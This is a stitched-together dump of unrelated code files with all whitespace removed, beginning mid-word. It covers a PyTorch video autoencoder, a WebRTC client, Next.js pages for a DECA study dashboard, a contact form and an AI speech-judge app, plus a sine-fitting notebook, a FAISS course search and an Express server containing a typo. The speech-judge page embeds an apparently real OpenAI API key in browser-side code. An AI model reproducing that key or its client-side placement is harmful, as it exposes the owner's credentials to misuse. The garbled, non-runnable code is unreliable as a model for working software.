ategy=="fixed":self.register_buffer("mix_factor",torch.Tensor([alpha]))elifself.merge_strategy=="learned":self.register_parameter("mix_factor",torch.nn.Parameter(torch.Tensor([alpha])))else:raiseValueError(f"unknownmergestrategy{self.merge_strategy}")defget_alpha(self,bs):ifself.merge_strategy=="fixed":returnself.mix_factorelifself.merge_strategy=="learned":returntorch.sigmoid(self.mix_factor)else:raiseNotImplementedError()defforward(self,x,temb,skip_video=False,timesteps=None):iftimestepsisNone:timesteps=self.timestepsb,c,h,w=x.shapex=super().forward(x,temb)ifnotskip_video:x_mix=rearrange(x,"(bt)chw->bcthw",t=timesteps)x=rearrange(x,"(bt)chw->bcthw",t=timesteps)x=self.time_stack(x,temb)alpha=self.get_alpha(bs=b//timesteps)x=alpha*x+(1.0-alpha)*x_mixx=rearrange(x,"bcthw->(bt)chw")returnxclassAE3DConv(torch.nn.Conv2d):def__init__(self,in_channels,out_channels,video_kernel_size=3,*args,**kwargs):super().__init__(in_channels,out_channels,*args,**kwargs)ifisinstance(video_kernel_size,Iterable):padding=[int(k//2)forkinvideo_kernel_size]else:padding=int(video_kernel_size//2)self.time_mix_conv=torch.nn.Conv3d(in_channels=out_channels,out_channels=out_channels,kernel_size=video_kernel_size,padding=padding,)defforward(self,input,timesteps,skip_video=False):x=super().forward(input)ifskip_video:returnxx=rearrange(x,"(bt)chw->bcthw",t=timesteps)x=self.time_mix_conv(x)returnrearrange(x,"bcthw->(bt)chw")classVideoBlock(AttnBlock):def__init__(self,in_channels:int,alpha:float=0,merge_strategy:str="learned"):super().__init__(in_channels)#nocontext,singleheaded,asinbaseclassself.time_mix_block=VideoTransformerBlock(dim=in_channels,n_heads=1,d_head=in_channels,checkpoint=False,ff_in=True,attn_mode="softmax",)time_embed_dim=self.in_channels*4self.video_time_embed=torch.nn.Sequential(torch.nn.Linear(self.in_channels,time_embed_dim),torch.nn.SiLU(),torch.nn.Linear(time_embed_dim,self.in_channels),)self.merge_strategy=merge_strategyifself.merge_strategy=="fixed":self.register_buffer("mix_factor",torch.Tensor([alpha]))elifself.merge_strategy=="learned":self.register_parameter("mix_factor",torch.nn.Parameter(torch.Tensor([alpha])))else:raiseValueError(f"unknownmergestrategy{self.merge_strategy}")defforward(self,x,timesteps,skip_video=False):ifskip_video:returnsuper().forward(x)x_in=xx=self.attention(x)h,w=x.shape[2:]x=rearrange(x,"bchw->b(hw)c")x_mix=xnum_frames=torch.arange(timesteps,device=x.device)num_frames=repeat(num_frames,"t->bt",b=x.shape[0]//timesteps)num_frames=rearrange(num_frames,"bt->(bt)")t_emb=timestep_embedding(num_frames,self.in_channels,repeat_only=False)emb=self.video_time_embed(t_emb)#b,n_channelsemb=emb[:,None,:]x_mix=x_mix+embalpha=self.get_alpha()x_mix=self.time_mix_block(x_mix,timesteps=timesteps)x=alpha*x+(1.0-alpha)*x_mix#alphamergex=rearrange(x,"b(hw)c->bchw",h=h,w=w)x=self.proj_out(x)returnx_in+xdefget_alpha(self,):ifself.merge_strategy=="fixed":returnself.mix_factorelifself.merge_strategy=="learned":returntorch.sigmoid(self.mix_factor)else:raiseNotImplementedError(f"unknownmergestrategy{self.merge_strategy}")classMemoryEfficientVideoBlock(MemoryEfficientAttnBlock):def__init__(self,in_channels:int,alpha:float=0,merge_strategy:str="learned"):super().__init__(in_channels)#nocontext,singleheaded,asinbaseclassself.time_mix_block=VideoTransformerBlock(dim=in_channels,n_heads=1,d_head=in_channels,checkpoint=False,ff_in=True,attn_mode="softmax-xformers",)time_embed_dim=self.in_channels*4self.video_time_embed=torch.nn.Sequential(torch.nn.Linear(self.in_channels,time_embed_dim),torch.nn.SiLU(),torch.nn.Linear(time_embed_dim,self.in_channels),)self.merge_strategy=merge_strategyifself.merge_strategy=="fixed":self.register_buffer("mix_factor",torch.Tensor([alpha]))elifself.merge_strategy=="learned":self.register_parameter("mix_factor",torch.nn.Parameter(torch.Tensor([alpha])))else:raiseValueError(f"unknownmergestrategy{self.merge_strategy}")defforward(self,x,timesteps,skip_time_block=False):ifskip_time_block:returnsuper().forward(x)x_in=xx=self.attention(x)h,w=x.shape[2:]x=rearrange(x,"bchw->b(hw)c")x_mix=xnum_frames=torch.arange(timesteps,device=x.device)num_frames=repeat(num_frames,"t->bt",b=x.shape[0]//timesteps)num_frames=rearrange(num_frames,"bt->(bt)")t_emb=timestep_embedding(num_frames,self.in_channels,repeat_only=False)emb=self.video_time_embed(t_emb)#b,n_channelsemb=emb[:,None,:]x_mix=x_mix+embalpha=self.get_alpha()x_mix=self.time_mix_block(x_mix,timesteps=timesteps)x=alpha*x+(1.0-alpha)*x_mix#alphamergex=rearrange(x,"b(hw)c->bchw",h=h,w=w)x=self.proj_out(x)returnx_in+xdefget_alpha(self,):ifself.merge_strategy=="fixed":returnself.mix_factorelifself.merge_strategy=="learned":returntorch.sigmoid(self.mix_factor)else:raiseNotImplementedError(f"unknownmergestrategy{self.merge_strategy}")defmake_time_attn(in_channels,attn_type="vanilla",attn_kwargs=None,alpha:float=0,merge_strategy:str="learned",):assertattn_typein["vanilla","vanilla-xformers",],f"attn_type{attn_type}notsupportedforspatio-temporalattention"print(f"makingspatialandtemporalattentionoftype'{attn_type}'with{in_channels}in_channels")ifnotXFORMERS_IS_AVAILABLEandattn_type=="vanilla-xformers":print(f"Attentionmode'{attn_type}'isnotavailable.Fallingbacktovanillaattention."f"ThisisnotaprobleminPytorch>=2.0.FYI,youarerunningwithPyTorchversion{torch.__version__}")attn_type="vanilla"ifattn_type=="vanilla":assertattn_kwargsisNonereturnpartialclass(VideoBlock,in_channels,alpha=alpha,merge_strategy=merge_strategy)elifattn_type=="vanilla-xformers":print(f"buildingMemoryEfficientAttnBlockwith{in_channels}in_channels...")returnpartialclass(MemoryEfficientVideoBlock,in_channels,alpha=alpha,merge_strategy=merge_strategy,)else:returnNotImplementedError()classConv2DWrapper(torch.nn.Conv2d):defforward(self,input:torch.Tensor,**kwargs)->torch.Tensor:returnsuper().forward(input)classVideoDecoder(Decoder):available_time_modes=["all","conv-only","attn-only"]def__init__(self,*args,video_kernel_size:Union[int,list]=3,alpha:float=0.0,merge_strategy:str="learned",time_mode:str="conv-only",**kwargs,):self.video_kernel_size=video_kernel_sizeself.alpha=alphaself.merge_strategy=merge_strategyself.time_mode=time_modeassert(self.time_modeinself.available_time_modes),f"time_modeparameterhastobein{self.available_time_modes}"super().__init__(*args,**kwargs)defget_last_layer(self,skip_time_mix=False,**kwargs):ifself.time_mode=="attn-only":raiseNotImplementedError("TODO")else:return(self.conv_out.time_mix_conv.weightifnotskip_time_mixelseself.conv_out.weight)def_make_attn(self)->Callable:ifself.time_modenotin["conv-only","only-last-conv"]:returnpartialclass(make_time_attn,alpha=self.alpha,merge_strategy=self.merge_strategy,)else:returnsuper()._make_attn()def_make_conv(self)->Callable:ifself.time_mode!="attn-only":returnpartialclass(AE3DConv,video_kernel_size=self.video_kernel_size)else:returnConv2DWrapperdef_make_resblock(self)->Callable:ifself.time_modenotin["attn-only","only-last-conv"]:returnpartialclass(VideoResBlock,video_kernel_size=self.video_kernel_size,alpha=self.alpha,merge_strategy=self.merge_strategy,)else:returnsuper()._make_resblock()constpubVideo=document.getElementById("pub_video");constsubVideo=document.getElementById("sub_video");constbntPubCam=document.getElementById("bnt_pubcam");constbntPubScreen=document.getElementById("bnt_pubscreen");constserverURL="ws://localhost:7000/ws";constconfig={iceServers:[{urls:"stun:stun.l.google.com:19302",},],};constsignalLocal=newSignal.IonSFUJSONRPCSignal(serverURL);constclientLocal=newIonSDK.Client(signalLocal,config);signalLocal.onopen=()=>clientLocal.join("testsession");conststart=(type)=>{if(type){IonSDK.LocalStream.getUserMedia({resolution:"vga",audio:true,codec:"vp8",}).then((media)=>{pubVideo.srcObject=media;pubVideo.autoplay=true;pubVideo.controls=true;pubVideo.muted=true;bntPubCam.disabled=true;bntPubScreen.disabled=true;clientLocal.publish(media);}).catch(console.error);}else{IonSDK.LocalStream.getDisplayMedia({resolution:"vga",audio:true,codec:"vp8",}).then((media)=>{pubVideo.srcObject=media;pubVideo.autoplay=true;pubVideo.controls=true;pubVideo.muted=true;bntPubCam.disabled=true;bntPubScreen.disabled=true;clientLocal.publish(media);}).catch(console.error);}}clientLocal.ontrack=(track,stream)=>{console.log("gottrack:",track.id,"forstream:",stream.id);track.onunmute=()=>{subVideo.srcObject=stream;subVideo.autoplay=true;subVideo.muted=false;stream.onremovetrack=()=>{subVideo.srcObject=null;}}}importHeadfrom'next/head';importImagefrom'next/image';importLinkfrom'next/link';import{FaGoogle}from'react-icons/fa';importMainfrom'../components/Main';import{initializeApp}from'firebase/app';import{getAuth,GoogleAuthProvider,signInWithPopup,signOut}from'firebase/auth';import{getFirestore,collection,getDocs,doc,setDoc}from'firebase/firestore';import{useAuthState}from'react-firebase-hooks/auth';import{signInWithGoogle,auth}from'@/firebase/firebase';import{Disclosure}from'@headlessui/react';import{Bars3Icon,XMarkIcon}from'@heroicons/react/24/outline';constnavigation=[//{name:"Finance",href:"#",current:false},//{name:"Marketing",href:"#",current:false},//{name:"BusinessManagement&Administration",href:"#",current:false},//{name:"Hospitality&Tourism",href:"#",current:false},];functionclassNames(...classes){returnclasses.filter(Boolean).join('');}exportdefaultfunctionHome(){const[user]=useAuthState(auth);return(<div><Head><title>DECADashboard</title><metaname='description'content='SuperchargeYourDECAStudying!'/><linkrel='icon'href='/favicon.ico'/></Head>{user?<Dashboard/>:<SignIn/>}</div>);}constSignIn=()=>{return(<divclassName='relativebg-whiteoverflow-hiddenh-screen'><divclassName='max-w-7xlmx-auto'><divclassName='relativez-10pb-8bg-whitesm:pb-16md:pb-20lg:max-w-lglg:w-fulllg:pb-28xl:pb-32'><mainclassName='mt-10mx-automax-w-7xllg:pt-40px-4sm:mt-12sm:px-6md:mt-16lg:mt-20lg:px-8xl:mt-28'><divclassName='sm:text-centerlg:text-left'><h1className='text-4xltracking-tightfont-extraboldtext-blue-500sm:text-5xlmd:text-6xl'><spanclassName='blockxl:inline'>DecaDashboard</span>{''}</h1><pclassName='mt-3text-basetext-gray-500sm:mt-5sm:text-lgsm:max-w-xlsm:mx-automd:mt-5md:text-xllg:mx-0'>DECADashboardofferscuratedMCQsandcasestudiesacrossallDECAclusters,providingafocusedplatformforstudentstohonetheircompetitiveedgeandbusinessacumen.</p><divclassName='mt-5sm:mt-8sm:flexsm:justify-centerlg:justify-start'><divclassName='rounded-mdmt-5shadow'><ahref='#'onClick={signInWithGoogle}className='w-fullflexitems-centerjustify-centerpx-8py-3borderborder-transparenttext-basefont-mediumrounded-mdtext-blue-500bg-blue-100hover:bg-blue-200md:py-4md:text-lgmd:px-10'><FaGoogleclassName='mr-2'/>SigninwithGoogle</a></div></div></div></main></div></div><divclassName='lg:absolutelg:inset-y-0lg:right-0lg:w-1/2'><imgclassName='h-fullw-fullobject-coversm:h-72md:h-96lg:w-fulllg:h-full'src='https://assets-global.website-files.com/635c470cc81318fc3e9c1e0e/6480c8e19218fd55a752cdd6_compete_hs_header.webp'alt=''/></div></div>);};functionDashboard(){varphoto=auth.currentUser.photoURL;//varnewphoto=photo.replace("s96-c","s100-c");return(<div><Disclosureas='nav'className=''>{({open})=>(<><divclassName='mx-automax-w-7xlpx-2sm:px-6lg:px-8'><divclassName='relativeflexh-16items-centerjustify-between'><divclassName='absoluteinset-y-0left-0flexitems-centersm:hidden'>{/*Mobilemenubutton*/}<Disclosure.ButtonclassName='relativeinline-flexitems-centerjustify-centerrounded-mdp-2text-gray-400focus:outline-nonefocus:ring-2focus:ring-insetfocus:ring-white'><spanclassName='absolute-inset-0.5'/><spanclassName='sr-only'>Openmainmenu</span>{open?(<XMarkIconclassName='blockh-6w-6'aria-hidden='true'/>):(<Bars3IconclassName='blockh-6w-6'aria-hidden='true'/>)}</Disclosure.Button></div><divclassName='flexflex-1items-centerjustify-centersm:items-stretchsm:justify-start'><divclassName='flexflex-shrink-0items-center'><ImageclassName='h-8w-auto'src='/DECA-Diamond-1.png'alt='YourCompany'width={500}height={500}/><spanclassName='text-blue-500font-semiboldrounded-mdpx-3py-2text-base'>DECADashboard</span></div><divclassName='hiddensm:ml-6sm:block'><divclassName='flexspace-x-4'>{navigation.map((item)=>(<akey={item.name}href={item.href}className={classNames('text-gray-500','rounded-mdpx-3py-2text-basefont-medium')}aria-current={item.current?'page':undefined}>{item.name}</a>))}</div></div></div><divclassName='absoluteinset-y-0right-0flexitems-centerpr-2sm:staticsm:inset-autosm:ml-6sm:pr-0'><buttontype='button'className='rounded-mdbg-gradient-to-rfrom-sky-500to-sky-400hover:from-sky-400hover:to-sky-300px-3.5py-1.5text-basefont-semiboldtext-whiteshadow-smhover:bg-indigo-500focus-visible:outlinefocus-visible:outline-2focus-visible:outline-offset-2focus-visible:outline-indigo-600'onClick={()=>signOut(auth)}>SignOut</button></div></div></div><Disclosure.PanelclassName='sm:hidden'><divclassName='space-y-1px-2pb-3pt-2'>{navigation.map((item)=>(<Disclosure.Buttonkey={item.name}as='a'href={item.href}className={classNames('text-gray-500','blockrounded-mdpx-3py-2text-basefont-medium')}aria-current={item.current?'page':undefined}>{item.name}</Disclosure.Button>))}</div></Disclosure.Panel></>)}</Disclosure><div><sectionclassName='bg-blend-darkenbg-coverbg-blue-500'><divclassName='py-8px-2mx-automax-w-7xllg:py-16lg:px-8'><divclassName=''><h1className='text-6xlfont-boldtext-white'>Welcome,{auth.currentUser.displayName.split('')[0]}</h1><h3className='text-2xlmt-4font-boldtext-white'>Chooseaneventbelowtogetstarted...</h3></div></div></section></div><Main/></div>);}importContactFormfrom'@/components/ContactForm';importNavbarfrom'@/components/Navbar';importHeadfrom'next/head';importFooterfrom'@/components/Footer';importdbfrom'@/firebase/firebase';import{collection,addDoc}from'firebase/firestore';constContact=()=>{constgenerateEmail=(values)=>{values['content']=`Hello${values['name']},\n\nWehavereceivedyourmessageregarding"${values['subject']}"andwillbeintouchwithyoushortly.Thankyouforreachingouttous!\n\nBest,\nCharlesWen\nEnduraScribe`;values['send_subject']='Thankyouforcontactingus!';values['type']='contact';returnvalues;};consthandleSubmit=async(values)=>{try{awaitaddDoc(collection(db,'contacts'),values);values=generateEmail(values);constresponse=awaitfetch('/api/email',{method:'POST',headers:{'Content-Type':'application/json',},body:JSON.stringify({values}),});if(response.ok){console.log('Emailsent');window.location.href='/contact/confirm';}else{thrownewError(response.statusText);}}catch(error){console.log('Errorsubmittingorder',error);}};return(<divclassName='bg-slate-50h-screenoverflow-auto'><Head><title>ContactUs</title><linkrel='icon'href='/favicon.png'/></Head><Navbar/><divclassName='flexjustify-centermt-10'><divclassName='max-w-lgrounded-xlshadow-lgbg-whitep-5'><h1className='text-4xlfont-boldtext-centermb-2'>ContactForm</h1><pclassName='text-gray-500'>Whenyousubmitthisform,youwillreceiveaconfirmationemail.Ourteamwillfollowupwithyouwithin48hours.</p></div></div><divclassName='m-10'><ContactFormonSubmit={handleSubmit}/></div><Footer/></div>);};exportdefaultContact;'useclient';import{useState,useEffect,useRef}from'react';//import{createClient}from'@deepgram/sdk';importOpenAIfrom'openai';importVapifrom'@vapi-ai/web';import{Inter}from'next/font/google';constinter=Inter({subsets:['latin']});exportdefaultfunctionRecordingPage(){const[notes,setNotes]=useState('');const[time,setTime]=useState(0);const[isRecording,setIsRecording]=useState(false);const[hasStarted,setHasStarted]=useState(false);const[speakingLength,setSpeakingLength]=useState(0);const[suggestions,setSuggestions]=useState([]);const[audioChunks,setAudioChunks]=useState([]);//ToholdaudiodatainmemoryletmediaRecorder=null;letstream=null;const[timeLeft,setTimeLeft]=useState(0);const[speakingJudge,setSpeakingJudge]=useState(null);const[topic,setTopic]=useState('');//Newstatefortopicconst[currentSpeaker,setCurrentSpeaker]=useState('');//ChangedinitialvaluetoemptystringconstOpenAI_API_KEY='sk-svcacct-MsWzbVh34xzDn4h13C2S_G0Cw9MhJaLCUxx3Ohz8Ww1bgjA3tyWNcK6H40oF6ruzBT3BlbkFJEEX1pjM--9F2VvJMnfgl9xDxmmTfYmD-jcyQwWy4S_ui_BHl6OKyN1CeYa93VDs9AA';constopenai=newOpenAI({apiKey:OpenAI_API_KEY,dangerouslyAllowBrowser:true,});constvapi=newVapi('bc70d4a2-9563-4172-bdb2-712b4084ba27');constvapi2=newVapi('bc70d4a2-9563-4172-bdb2-712b4084ba27');constvapi3=newVapi('bc70d4a2-9563-4172-bdb2-712b4084ba27');//Listofvapisconstvapis=[vapi,vapi2,vapi3];constvapis_name=['vapi','vapi2','vapi3'];//mapofvapisandassistantidconstvapiMap={vapi:{assistant_id:'181a8564-58b5-4168-ad01-b53fa5f8f06e',voice_id:'jennifer',assistant_name:'WayneShaw',content:"Youareacriticalimpromptuspeechjudge.Challengetheideasintheuser'sspeech.Theuserhasjustfinishedtheirspeech.",},vapi2:{assistant_id:'205d0a42-d818-495c-9496-7fee04e2d98c',voice_id:'s3://voice-cloning-zero-shot/7b97b543-7877-41b6-86ee-aa1e0b6c110e/dicksaad/manifest.json',assistant_name:'ArnavGupta',content:'Youareasupportiveimpromptuspeechjudge.Theuserhasjustfinishedtheirspeech.',},vapi3:{assistant_id:'d7f80236-caa5-47a7-94fe-ae8705f77bf1',voice_id:'chris',assistant_name:'6thGrader',content:"Youareacuriousimpromptuspeechjudge.Questiontheideasintheuser'sspeech.Theuserhasjustfinishedtheirspeech.",},};//Fetchnotes,speakingLength,andsuggestionsfromlocalStorageonpageloaduseEffect(()=>{conststoredNotes=localStorage.getItem('notes');conststoredSpeakingLength=localStorage.getItem('speakingLength');conststoredSuggestions=localStorage.getItem('geminiSuggestions');conststoredTopic=localStorage.getItem('topic');//FetchtopicfromlocalStorageif(storedNotes){setNotes(storedNotes);}if(storedSpeakingLength){setSpeakingLength(parseInt(storedSpeakingLength,10));setTimeLeft(parseInt(storedSpeakingLength,10));//InitializetimeLeft}if(storedSuggestions){setSuggestions(JSON.parse(storedSuggestions));}if(storedTopic){setTopic(storedTopic);//Setthetopicstate}},[]);//TimerlogicuseEffect(()=>{lettimer;if(isRecording&&timeLeft>0){timer=setInterval(()=>{setTimeLeft((prevTime)=>prevTime-1);},1000);}elseif(timeLeft===0&&isRecording){setIsRecording(false);stopRecording();}return()=>clearInterval(timer);},[isRecording,timeLeft]);//StartrecordinghandlerconststartRecording=()=>{setIsRecording(true);setHasStarted(true);setTimeLeft(speakingLength);//ResettimertospeakinglengthstartMicrophoneStream(speakingLength);setCurrentSpeaker('User');//SetcurrentspeakertoUserwhenrecordingstarts};//StoprecordinghandlerconststopRecording=async()=>{setIsRecording(false);if(mediaRecorder&&stream){mediaRecorder.stop();stream.getTracks().forEach((track)=>track.stop());//Stopmicrophonestream}consttranscript=awaittranscribeAudio();localStorage.setItem('transcription',transcript);//SavetranscriptioninlocalStoragelocalStorage.setItem('history',`UserSpeech:`+transcript+'\n');//ExecuteVAPIinteractionexecuteVapiInteraction();};constexecuteVapiInteraction=async()=>{//Getarandomvapiletrand=Math.floor(Math.random()*vapis.length);constcurr=vapis[rand];constcurr_name=vapis_name[rand];//SetthespeakingjudgesetSpeakingJudge(curr_name);//Translatecode//if(curr_name=="vapi"){//j1.style.className='translateY(-0.5rem)';//}//else{//j1.style.className='translateY(0)';//}//if(curr_name=="vapi2"){//j2.style.className='translateY(-0.5rem)';//}//else{//j2.style.className='translateY(0)';//}//if(curr_name=="vapi3"){//j3.style.className='translateY(-0.5rem)';//}//else{//j3.style.className='translateY(0)';//}////EndTranslateCodelettotalResponse='';console.log('VAPI:',vapiMap[curr_name]['assistant_name']);curr.start(vapiMap[curr_name]['assistant_id'],{transcriber:{provider:'deepgram',model:'nova-2',language:'en-US',},model:{provider:'openai',model:'gpt-3.5-turbo',messages:[{role:'system',content:vapiMap[curr_name]['content'],},],},voice:{provider:'playht',voiceId:vapiMap[curr_name]['voice_id'],},name:vapiMap[curr_name]['assistant_name'],});console.log('VAPISTARTED');curr.send({type:'add-message',message:{role:'user',content:'Considerthepreviouschathistorywhenrespondingtotheuser:'+localStorage.getItem('history'),},});curr.on('message',(message)=>{//iftranscripttypeexistandequals"final"if(message.transcriptType==='final'){totalResponse+=message.transcript;}});curr.on('speech-start',()=>{console.log('START');setCurrentSpeaker(vapiMap[curr_name]['assistant_name']);});curr.on('speech-end',()=>{localStorage.setItem('history',vapiMap[curr_name]['assistant_name']+':'+totalResponse+'\n');console.log('END.');curr.stop();setSpeakingJudge(null);setCurrentSpeaker('User');executeVapiInteraction();});};//Formattimeinmm:ssconstformatTime=(seconds)=>{constminutes=Math.floor(seconds/60);constremainingSeconds=seconds%60;return`${minutes}:${remainingSeconds<10?'0':''}${remainingSeconds}`;};conststartMicrophoneStream=(duration)=>{//Getthemicrophonestreamandstoreaudiodatainmemorynavigator.mediaDevices.getUserMedia({audio:true}).then((micStream)=>{stream=micStream;mediaRecorder=newMediaRecorder(stream);letchunks=[];mediaRecorder.ondataavailable=(event)=>{chunks.push(event.data);};mediaRecorder.onstop=()=>{constaudioBlob=newBlob(chunks,{type:'audio/mp3'});console.log('AudioBlob:',audioBlob);setAudioChunks(audioBlob);//Storeaudiodatainmemory};mediaRecorder.start();setTimeout(()=>{stopRecording();},duration*1000);//Stoprecordingafterthespecifiedduration});};consttranscribeAudio=async()=>{if(audioChunks.length>0){constfile=newFile([audioChunks],'recording.mp3',{type:'audio/mp3',});constformData=newFormData();formData.append('file',file);consttranscription=awaitopenai.audio.transcriptions.create({file:formData.get('file'),model:'whisper-1',});console.log('Transcription:',transcription.text);returntranscription.text;}};return(<divclassName={`min-h-screenbg-gray-100p-8${inter.className}flexrelative`}>{/*LeftSection(Recording+Judges)*/}<divclassName='w-2/3p-4flexflex-col'>{/*TimerandRecordingButtononthesameline*/}<divclassName='w-fullflexjustify-betweenmb-4items-center'>{isRecording?(<buttononClick={stopRecording}className='bg-red-500hover:bg-red-400text-whitefont-boldpy-2px-6rounded'>StopRecording</button>):(<buttononClick={startRecording}className='bg-green-500hover:bg-green-400text-whitefont-boldpy-2px-6rounded'>StartRecording</button>)}<divclassName='text-lgfont-semiboldtext-whitebg-red-400px-4py-2rounded-full'>Timer:{formatTime(timeLeft)}⏱️</div></div>{/*RecordingStatus*/}{hasStarted&&(<divclassName={`w-fullp-4rounded-lgbordertext-centermb-4${isRecording?'bg-gray-200border-gray-400text-gray-600':'bg-red-100border-red-500text-red-600'}`}>{isRecording?'RecordinginProgress...':'RecordingStopped'}</div>)}{/*JudgesFeedbackSection*/}<divclassName='w-fullmb-6mt-8'><h2className='text-2xlfont-boldmb-4'>JudgesFeedback:</h2><divclassName='gridgrid-cols-3gap-4mt-10'>{/*Judge1*/}<divclassName={`bg-whiteshadow-mdp-4rounded-lgrelative${speakingJudge==='vapi'?'bg-yellow-100transform-translate-y-3.5':''}transition-allduration-300`}><h3className='text-xlfont-semiboldmb-2'>WayneShaw</h3><pclassName='text-gray-600mb-4'>Provide<spanclassName='font-bold'>critical</span>feedbackonthespeech.</p><divclassName='mb-16'></div><divclassName='absolutebottom-0left-1/2transform-translate-x-1/2translate-y-1/2w-24h-24rounded-fullbg-gray-300overflow-hiddenborder-4border-white'><imgsrc='nd.jpg'alt='Judge1'className='w-fullh-fullobject-cover'/></div></div>{/*Judge2*/}<divclassName={`bg-whiteshadow-mdp-4rounded-lgrelative${speakingJudge==='vapi2'?'bg-yellow-100transform-translate-y-3.5':''}transition-allduration-300`}><h3className='text-xlfont-semiboldmb-2'>ArnavGupta</h3><pclassName='text-gray-600mb-4'>Provide<spanclassName='font-bold'>understanding</span>feedbackonthespeech.</p><divclassName='mb-16'></div><divclassName='absolutebottom-0left-1/2transform-translate-x-1/2translate-y-1/2w-24h-24rounded-fullbg-gray-300overflow-hiddenborder-4border-white'><imgsrc='nav.jpg'alt='Judge2'className='w-fullh-fullobject-cover'/></div></div>{/*Judge3*/}<divclassName={`bg-whiteshadow-mdp-4rounded-lgrelative${speakingJudge==='vapi3'?'bg-yellow-100transform-translate-y-3.5':''}transition-allduration-300`}><h3className='text-xlfont-semiboldmb-2'>6thGrader</h3><pclassName='text-gray-600mb-4'>Provide<spanclassName='font-bold'>curious</span>feedbackonthespeech.</p><divclassName='mb-16'></div><divclassName='absolutebottom-0left-1/2transform-translate-x-1/2translate-y-1/2w-24h-24rounded-fullbg-gray-300overflow-hiddenborder-4border-white'><imgsrc='st.jpg'alt='Judge3'className='w-fullh-fullobject-cover'/></div></div></div></div></div><divclassName='relative'><buttonclassName='absolutebottom-4right-4bg-red-500hover:bg-red-400text-whitefont-boldpy-2px-6roundedw-44'onClick={()=>{window.location.href='/summary';}}>EndFeedback</button></div>{/*RightSection(Topic,NotesandSuggestions)*/}<divclassName='w-1/3p-4bg-gray-50borderborder-gray-300rounded-lgh-autoflexflex-col'>{/*NewTopicSection*/}<h2className='text-2xlfont-boldmb-2'>Topic:</h2><divclassName='w-fullp-3mb-4bg-whiteborderborder-gray-300rounded-md'><pclassName='text-lg'>{topic}</p></div><h2className='text-2xlfont-boldmb-2'>PreviousNotes:</h2><textareaclassName='w-fullp-3h-40borderborder-gray-300rounded-mdbg-gray-50resize-nonemb-4'value={notes}readOnly/>{/*SuggestionsSection*/}<h2className='text-2xlfont-boldmb-2'>GeminiSuggestions:</h2><ulclassName='list-disclist-inside'>{suggestions.map((suggestion,index)=>(<likey={index}className='text-lgmb-2'>{suggestion}</li>))}</ul></div>{/*CurrentSpeakerBox*/}<divclassName='absolutebottom-4left-4bg-whiteshadow-mdp-2rounded-lg'><pclassName='text-smfont-semibold'>Speaking:{currentSpeaker}</p></div></div>);}importReact,{useState}from'react';functionSignUp(){const[user,setUser]=useState(null);constsignUp=()=>{};return(<divclassName='signUp'><label>SignUp</label><inputplaceholder='FirstName'onChange={(event)=>{setUser({...user,firstName:event.target.value});}}/><inputplaceholder='LastName'onChange={(event)=>{setUser({...user,lastName:event.target.value});}}/><inputplaceholder='Username'onChange={(event)=>{setUser({...user,username:event.target.value});}}/><inputplaceholder='Password'type='password'onChange={(event)=>{setUser({...user,password:event.target.value});}}/><buttononClick={signUp}>SignUp</button></div>);}exportdefaultSignUp;#%%importnumpyasnpimportosfromtensorflowimportkerasfromncpsimportwiringsfromncps.tfimportLTCimportmatplotlib.pyplotaspltimportseabornassns#%%n=48#(1,n,1)rangefrom0to4pix=np.linspace(0,4*np.pi,n).reshape(1,n,1)y=np.sin(x)#%%wiring=wirings.FullyConnected(20,1)model=keras.models.Sequential([keras.layers.InputLayer(input_shape=(None,x.shape[-1])),LTC(wiring,return_sequences=True),])model.compile(optimizer='adam',loss='mse')model.summary()#%%hist=model.fit(x=x,y=y,batch_size=1,epochs=2000,verbose=1)#%%#Let'svisualizethetraininglosssns.set()plt.figure(figsize=(6,4))plt.plot(hist.history['loss'],label='Trainingloss')plt.legend(loc='upperright')plt.xlabel('Trainingsteps')plt.show()#%%#Howdoesthetrainedmodelnowfittothesinusoidalfunction?prediction=model(x).numpy()plt.figure(figsize=(6,4))plt.plot(y[0,:,0],label='Targetoutput')plt.plot(prediction[0,:,0],label='LTCoutput',linestyle='dashed')plt.ylim((-1,1))plt.legend(loc='upperright')plt.title('Aftertraining')#plt.show()#copyimagetoclipboardplt.savefig('sinusoidal.png',dpi=300,bbox_inches='tight')importnumpyasnpimportmatplotlib.pyplotasplt#Definingthevectorvv=np.array([1,1])#Createaxisofplotasaxisaxis=plt.axes()importosimportfaissimportjsonimporttorchfromtransformersimportBertTokenizer,BertModelimportnumpyasnpos.environ["KMP_DUPLICATE_LIB_OK"]="TRUE"index=faiss.read_index('semantic_search/models/subhash_course_faiss_index.index')withopen('semantic_search/models/subhash_course_metadata.json','r')asf:courses=json.load(f)tokenizer=BertTokenizer.from_pretrained('bert-base-uncased')model=BertModel.from_pretrained('bert-base-uncased')#.to('cuda'iftorch.cuda.is_available()else'cpu')#Functiontogetembeddingsforquerydefget_embeddings(text):inputs=tokenizer(text,return_tensors="pt",truncation=True,padding=True).to('cuda'iftorch.cuda.is_available()else'cpu')withtorch.no_grad():outputs=model(**inputs)returnoutputs.last_hidden_state.mean(dim=1).squeeze()#FunctiontosearchcoursesandreturntheminthespecifiedformatdefgetCourses(query:str,topK:int):try:query_embedding=get_embeddings(query).cpu().numpy().reshape(1,-1)distances,indices=index.search(query_embedding,topK)results=[]foridx,distinzip(indices[0],distances[0]):course=courses[idx]course_result={"subject":course["subject"],#Accesssubject"number":course["number"],#Accessnumber"score":float(dist),#FAISSdistanceasscore}results.append(course_result)returnresultsexceptExceptionase:print(e)return[]#Examplequeryuser_query="findmecoursesthatareattheintersectionofcomputerscienceandmarinebiology"matched_courses=getCourses(user_query,topK=5)forcourseinmatched_courses:print(course)importexpressfrom'express';importcorsfrom'cors';constapp=express();ass.use(cors());app.use(express.json());app.listen(3001,()=>{console.log('Serverstartedonport3001!');})constFooter=()=>{constfooterColumns=[{title:'Company',pages:['Aboutus','Termsandconditions','Privacypolicy'],links:['/about','/terms','/privacy'],},{title:'Gethelp',pages:['Contact'],links:['/contact'],},{title:'OurProducts',pages:['Shop','Order'],links:['/shop','/order'],},];return(<footerclassName='text-blackpy-20'><hrclassName='w-48h-1mx-automy-4border-0rounded-2xlmd:my-10bg-gray-500'/><divclassName='containermx-autopx-4'><divclassName='flexflex-wrap'>{footerColumns.map((col,i)=>(<divkey={i}className='w-fullmd:w-1/3px-4mb-8md:mb-0'><h4className='text-lgmb-6font-semibold'>{col.title}</h4><ulclassName='text-sm'>{col['pages']?.map((link,j)=>(<likey={j}className='mb-2'><ahref={col['links'][j]}className='hover:text-gray-500'>{link}</a></li>))}</ul></div>))}</div></div><divclassName='flexjustify-betweenitems-centermx-autow-3/5px-2sm:px-6lg:px-8pt-10'><divclassName='flexitems-center'><pclassName='text-gray-400cursor-default'>&#169;2024End